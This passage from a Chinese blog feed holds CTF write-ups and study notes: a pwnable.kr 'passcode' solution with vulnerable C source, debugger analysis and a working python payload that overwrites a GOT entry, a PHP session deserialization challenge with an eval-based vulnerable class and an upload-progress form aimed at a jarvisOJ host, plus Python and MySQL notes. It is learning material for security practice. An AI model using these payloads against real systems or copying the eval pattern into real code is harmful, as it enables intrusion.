class="line"><span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>作为一名小白还是要好好地分析栈帧的构造</p><p>那要怎么分析程序呢？最关键的还是分析程序的交互过程，毕竟我们也是从程序的输入入手的。</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  0x804862a &lt;welcome+33&gt;    mov    eax, 0x80487dd</span><br><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">► 0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">  0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br></pre></td></tr></table></figure></p><p>此处是调用<code>scanf</code>函数的过程， 先将一个地址<code>0x80487dd</code>赋值给eax寄存器，之后将ebp-0x70的地址传给edx寄存器，注意到这里的操作符是<code>lea</code>之后再将edx寄存器的值放到栈的第二层，最后将eax寄存器的值放到栈顶。 所以调用scanf函数的时候，栈顶是<code>0x80487dd</code>，往下加4个字节存储的是一个局部变量开始的位置(就是字符串s的首地址)</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  0x804862f &lt;welcome+38&gt;    lea    edx, [ebp - 0x70]</span><br><span class="line">  0x8048632 &lt;welcome+41&gt;    mov    dword ptr [esp + 4], edx</span><br><span class="line">  0x8048636 &lt;welcome+45&gt;    mov    dword ptr [esp], eax</span><br><span class="line">► 0x8048639 &lt;welcome+48&gt;    call   __isoc99_scanf@plt &lt;0x80484a0&gt;</span><br><span class="line">       format: 0x80487dd ◂— &apos;%100s&apos;</span><br><span class="line">       vararg: 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure></p><p>这是参数的传递过程此时栈上的布局：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ esp  0xff8e7050 —▸ 0x80487dd ◂— and    eax, 0x73303031 /* &apos;%100s&apos; */</span><br><span class="line">01:0004│      0xff8e7054 —▸ 0xff8e7068 ◂— 0x28 /* &apos;(&apos; */</span><br></pre></td></tr></table></figure></p><p>这里有一点疑惑</p><p>直接查看内存</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20x 0x80487dd</span><br><span class="line">0x80487dd:0x30303125</span><br></pre></td></tr></table></figure></p><p>0x30303125 其实就是%100的小端表示！！</p><p>但是换一种方式看</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20i 0x80487dd</span><br><span class="line">   0x80487dd:and    eax,0x73303031</span><br><span class="line">   0x80487e2:add    BYTE PTR [edi+0x65],dl</span><br></pre></td></tr></table></figure></p><p>到底是数据还是指令全看程序员了</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">passcode@prowl:~$ python -c &quot;print &apos;A&apos;*96+&apos;\x04\xa0\x04\x08&apos;+str(0x080485d7)&quot; | ./passcode</span><br><span class="line">Toddler&apos;s Secure Login System 1.0 beta.</span><br><span class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!</span><br><span class="line">enter passcode1 : Login OK!</span><br><span class="line">Sorry mom.. I got confused about scanf usage :(</span><br><span class="line">Now I can safely trust you that you have credential :)</span><br></pre></td></tr></table></figure></p><p>不过这道题目我没有搞得很清楚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;pwnable从小白开始&lt;/h1&gt;
&lt;p&gt;pwnable是一个适合小白的网站&lt;/p&gt;
&lt;p&gt;https://pwnable.kr/play.php&lt;/p&gt;
&lt;h2&gt;fd&lt;/h2&gt;
&lt;p&gt;有源码：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;ta
      
    
    </summary>
    
      <category term="pwn" scheme="https://prontosil.club/categories/pwn/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="pwn" scheme="https://prontosil.club/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python文档阅读笔记1</title>
    <link href="https://prontosil.club/2019/07/24/python%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B01/"/>
    <id>https://prontosil.club/2019/07/24/python文档阅读笔记1/</id>
    <published>2019-07-24T12:45:43.000Z</published>
    <updated>2019-07-24T12:48:41.773Z</updated>
    
    <content type="html"><![CDATA[<h1>python 官方文档阅读</h1><p>python可视化编程<a href="http://www.pythontutor.com/visualize.html#mode=edit" target="_blank" rel="noopener">网站</a></p><h2>循环</h2><h3>循环的问题</h3><p>list类型是可变序列</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">words = [<span class="string">'cat'</span>, <span class="string">'window'</span>, <span class="string">'defenestrate'</span>]</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words[:]:</span><br><span class="line">    <span class="keyword">if</span> len(w) &gt; <span class="number">6</span>:</span><br><span class="line">        words.insert(<span class="number">0</span>, w)</span><br><span class="line">print(words)</span><br></pre></td></tr></table></figure></p><p>如果将上述代码的循环语句改为：<code>for w in words:</code>那么这个循环就变成了死循环原因是words这个<code>list</code>会被修改</p><p>同样的可以看这个：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">basket = [<span class="string">'apple'</span>, <span class="string">'orange'</span>, <span class="string">'pear'</span>, <span class="string">'orange'</span>, <span class="string">'banana'</span>]</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> sorted(basket):</span><br><span class="line">    print(f)</span><br><span class="line"></span><br><span class="line">print(basket)</span><br></pre></td></tr></table></figure></p><p>在经过<code>sorted</code>函数之后，basket已经被修改了</p><p>可以看这个：</p><p>&lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=basket%20%3D%20%5B'apple',%20'orange',%20'pear',%20'orange',%20'banana'%5D%0Afor%20f%20in%20sorted%28basket%29%3A%0A%20%20%20%20print%28f%29%0A&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=5&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt;</p><p>同样的list还有这样一个问题：</p><p>代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a, L=[])</span>:</span></span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line">print(f(<span class="number">1</span>))</span><br><span class="line">print(f(<span class="number">2</span>))</span><br><span class="line">print(f(<span class="number">3</span>))</span><br></pre></td></tr></table></figure></p><p>&lt;iframe width=&quot;800&quot; height=&quot;500&quot; frameborder=&quot;0&quot; src=&quot;http://pythontutor.com/iframe-embed.html#code=def%20f%28a,%20L%3D%5B%5D%29%3A%0A%20%20%20%20L.append%28a%29%0A%20%20%20%20return%20L%0A%0Aprint%28f%281%29%29%0Aprint%28f%282%29%29%0Aprint%28f%283%29%29&amp;codeDivHeight=400&amp;codeDivWidth=350&amp;cumulative=false&amp;curInstr=15&amp;heapPrimitives=nevernest&amp;origin=opt-frontend.js&amp;py=3&amp;rawInputLstJSON=%5B%5D&amp;textReferences=false&quot;&gt; &lt;/iframe&gt;</p><p>修改成这样就行：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a, L = None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> L <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(a)</span><br><span class="line">    <span class="keyword">return</span> L</span><br></pre></td></tr></table></figure></p><h3>循环的tricks</h3><p>dict循环</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">knights = &#123;<span class="string">'gallahad'</span>:<span class="string">'the pure'</span>, <span class="string">'robin'</span>:<span class="string">'the brave'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> knights.items():</span><br><span class="line">    print(key, value)</span><br></pre></td></tr></table></figure></p><p>list循环</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate([<span class="string">'tac'</span>, <span class="string">'tic'</span>, <span class="string">'toe'</span>]):</span><br><span class="line">    print(<span class="string">"index = &#123;&#125;, value = &#123;&#125;"</span>.format(index, value))</span><br></pre></td></tr></table></figure></p><p>两个list循环</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">questions = [<span class="string">'name'</span>, <span class="string">'quest'</span>, <span class="string">'favorite color'</span>]</span><br><span class="line">answers = [<span class="string">'lancelot'</span>, <span class="string">'the holy grail'</span>, <span class="string">'blue'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> q,a <span class="keyword">in</span> zip(questions, answers):</span><br><span class="line">    print(<span class="string">"what is your &#123;&#125;? It is &#123;&#125;"</span>.format(q, a))</span><br></pre></td></tr></table></figure></p><p>逆向循环</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 逆向循环序列时，先正向，再调用reverse()函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reversed(range(<span class="number">1</span>, <span class="number">10</span>, <span class="number">2</span>)):</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure></p><p>指定顺序循环，用<code>sorted</code>函数</p><h3>参数的传递</h3><p>之前还一直没明白python中<code>**param</code>这种传递形式的用法这个栗子就很棒啦</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheeseshop</span><span class="params">(kind, *arguments, **keywords)</span>:</span></span><br><span class="line">    print(<span class="string">"-- Do you have any"</span>, kind, <span class="string">"?"</span>)</span><br><span class="line">    print(<span class="string">"-- I'm sorry, we're all out of"</span>, kind)</span><br><span class="line">    <span class="keyword">for</span> arg <span class="keyword">in</span> arguments:</span><br><span class="line">        print(arg)</span><br><span class="line">    print(<span class="string">"-"</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="keyword">for</span> kw <span class="keyword">in</span> keywords:</span><br><span class="line">        print(kw, <span class="string">":"</span>, keywords[kw])</span><br><span class="line">cheeseshop(<span class="string">"Limburger"</span>, <span class="string">"It's very runny, sir."</span>,</span><br><span class="line">           <span class="string">"It's really very, VERY runny, sir."</span>,shopkeeper=<span class="string">"Michael Palin"</span>,</span><br><span class="line">           client=<span class="string">"John Cleese"</span>,</span><br><span class="line">           sketch=<span class="string">"Cheese Shop Sketch"</span>)</span><br></pre></td></tr></table></figure></p><p>结果如下：</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-- Do you have any Limburger ?</span><br><span class="line">-- I&apos;m sorry, we&apos;re all out of Limburger</span><br><span class="line">It&apos;s very runny, sir.</span><br><span class="line">It&apos;s really very, VERY runny, sir.</span><br><span class="line">----------------------------------------</span><br><span class="line">shopkeeper : Michael Palin</span><br><span class="line">sketch : Cheese Shop Sketch</span><br><span class="line">client : John Cleese</span><br></pre></td></tr></table></figure></p><p>第一个kind参数就是第一个字符串，之后<code>arguments</code>相当于一个接收了一个list，keywords接收了一个dict</p><h4>解包参数列表</h4><p>比如这个栗子：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">args = [<span class="number">3</span>,<span class="number">6</span>]</span><br><span class="line">list(range(*args))</span><br></pre></td></tr></table></figure></p><p>输出的结果就是[3,4,5]</p><p>也就是说我们可以通过<code>*</code>运算符来对一个list进行解包并将其作为参数传递</p><h4>匿名函数lambda</h4><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pairs = [(<span class="number">1</span>, <span class="string">'one'</span>), (<span class="number">2</span>, <span class="string">'two'</span>), (<span class="number">3</span>, <span class="string">'three'</span>), (<span class="number">4</span>, <span class="string">'four'</span>)]</span><br><span class="line">pairs.sort(key=<span class="keyword">lambda</span>  pair:pair[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></p><p>sort方法有两个参数，一个是指定待排序的关键字，一个是reversed，其中key用一个匿名函数进行指定，有一点函数式编程的味道</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;python 官方文档阅读&lt;/h1&gt;
&lt;p&gt;python可视化编程&lt;a href=&quot;http://www.pythontutor.com/visualize.html#mode=edit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;网站&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="python" scheme="https://prontosil.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>探寻数据库</title>
    <link href="https://prontosil.club/2019/07/22/%E6%8E%A2%E5%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://prontosil.club/2019/07/22/探寻数据库/</id>
    <published>2019-07-22T14:54:21.000Z</published>
    <updated>2019-07-22T14:55:29.848Z</updated>
    
    <content type="html"><![CDATA[<h1>mysql命令行操作小结</h1><p>感觉这些知识又快忘记了</p><ul><li>登陆 <code>mysql -u root -p</code></li><li>创建数据库 <code>create database databasename</code></li><li>删除数据库 <code>drop database databasename</code></li><li>从外部sql文件导入，如果sql文件中没有创建数据库需要先指定一个数据库然后<code>source path/*.sql</code>就可以导入了，再也不用受烦人的<code>phpmyadmin</code>影响了</li><li>删除数据表<code>drop table table_name</code></li><li>导出表<code>mysqldump -u root -p RUNOOB runoob_tbl &gt; dump.txt</code></li><li>导出数据库<code>mysqldump -u root -p RUNOOB &gt; database_dump.txt</code></li><li>备份所有数据库<code>mysqldump -u root -p --all-databases &gt; database_dump.txt</code></li></ul><p>一般<code>sql</code>文件的写法：</p><p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> DBName;</span><br><span class="line">creat database DBName;</span><br><span class="line"><span class="keyword">use</span> DBName;</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始创建表</span></span><br><span class="line"><span class="keyword">create</span> ......</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始插入数据</span></span><br><span class="line">insert....</span><br></pre></td></tr></table></figure></p><h2>使用<code>pymysql</code>连接数据库</h2><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymsql</span><br><span class="line">con = pymysql.connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">''</span>, <span class="string">'mpsa'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> con.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">        sql = <span class="string">'drop database runoob'</span></span><br><span class="line">        cursor.execute(sql)</span><br><span class="line"></span><br><span class="line">    con.commit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    con.close()</span><br></pre></td></tr></table></figure></p><p>那个<code>cursor</code>函数我也不是很明白为什么，不过一般的用法就是这样啦</p><h2>php连接数据库</h2><p>使用php连接数据库,创建数据库，然后删除</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$conn = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line"><span class="keyword">if</span>(!$conn)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"error!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"连接成功"</span>;</span><br><span class="line"><span class="comment">//查询数据</span></span><br><span class="line">$sql = <span class="string">"create database runoob"</span>;</span><br><span class="line">$retval = mysqli_query($conn, $sql);</span><br><span class="line"><span class="keyword">if</span>(!$retval)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"查询数据失败！"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"创建成功"</span>;</span><br><span class="line">$sql1 = <span class="string">"drop database runoob"</span>;</span><br><span class="line">$retval = mysqli_query($conn, $sql);</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p><p>遇到了问题：</p><p><img src="https://i.imgur.com/IcnNipt.png" alt="php6"></p><p>查了一下<code>stackoverflow</code>看到了这个回答：</p><blockquote><p>The mysqli-&gt;connect_error property only works properly as of PHP versions 5.2.9 and 5.3.0. Use the mysqli_connect_error() function if compatibility with earlier PHP versions is required.</p></blockquote><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'localhost'</span>, <span class="string">'my_user'</span>, <span class="string">'my_password'</span>, <span class="string">'my_db'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the "official" OO way to do it,</span></span><br><span class="line"><span class="comment"> * BUT $connect_error was broken until PHP 5.2.9 and 5.3.0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Connect Error ('</span> . $mysqli-&gt;connect_errno . <span class="string">') '</span></span><br><span class="line">            . $mysqli-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use this instead of $connect_error if you need to ensure</span></span><br><span class="line"><span class="comment"> * compatibility with PHP versions prior to 5.2.9 and 5.3.0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_error()) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Connect Error ('</span> . mysqli_connect_errno() . <span class="string">') '</span></span><br><span class="line">            . mysqli_connect_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>原来是建立过程中的不稳定，怪不得我新建的数据库没有被删掉.</p><h1>参考</h1><p><a href="https://stackoverflow.com/questions/18831863/property-access-is-not-allowed-yet-warning-when-using-prepared-statement" target="_blank" rel="noopener">stackoverflow的回答</a><a href="https://pymysql.readthedocs.io/en/latest/user/development.html" target="_blank" rel="noopener">pymysql文档，写的很简单</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;mysql命令行操作小结&lt;/h1&gt;
&lt;p&gt;感觉这些知识又快忘记了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登陆 &lt;code&gt;mysql -u root -p&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;创建数据库 &lt;code&gt;create database databasename&lt;/code&gt;&lt;
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="sql" scheme="https://prontosil.club/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>php-challenge9</title>
    <link href="https://prontosil.club/2019/07/22/php-challenge9/"/>
    <id>https://prontosil.club/2019/07/22/php-challenge9/</id>
    <published>2019-07-22T14:50:01.000Z</published>
    <updated>2019-07-22T14:59:18.962Z</updated>
    
    <content type="html"><![CDATA[<h1>php-challenge 9</h1><p>第一次接触到这个题目，被惊呆了</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $mdzz;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">   $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">   highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>初看源代码觉得并没有哪里可以让我反序列化注入的地方但是问题就出在第一句话：<code>ini_set('session.serialize_handler', 'php');</code></p><blockquote><p>关键点在于，如果脚本中设置的序列化处理器与php.ini设置的不同，或者两个脚本注册session使用的序列化处理器不同，那么就会出现安全问题。</p></blockquote><p>只需要加一个<code>|</code>就行</p><p>这道<code>jarvisOj</code><a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">题目</a>就是这个原题这里还用到了另外一个漏洞：</p><p>自己构造一个网页如下：</p><p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后在上传一个文件，本地抓包，这里遇到了一点小问题，就是没办法抓到本地的包，可以通过直接对局域网的网络连接进行设置即可.</p><p><img src="../assets/flag1_rw5qoyd8a.png" alt="flag1">此时就可以看到了</p><p>接下来继续利用<img src="/assets/flag2_5a75jqie7.png" alt="flag2"></p><p>tql。。。<a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">有趣的php反序列化总结</a><a href="https://blog.szfszf.top/tech/code-audit-challenge-%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e7%bb%83%e4%b9%a0%e7%ac%94%e8%ae%b0/#challenge9" target="_blank" rel="noopener">szfszf</a><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">jarvisoj-web-writeup</a></p>]]></content>
    
    <summary type="html">
    
      
      
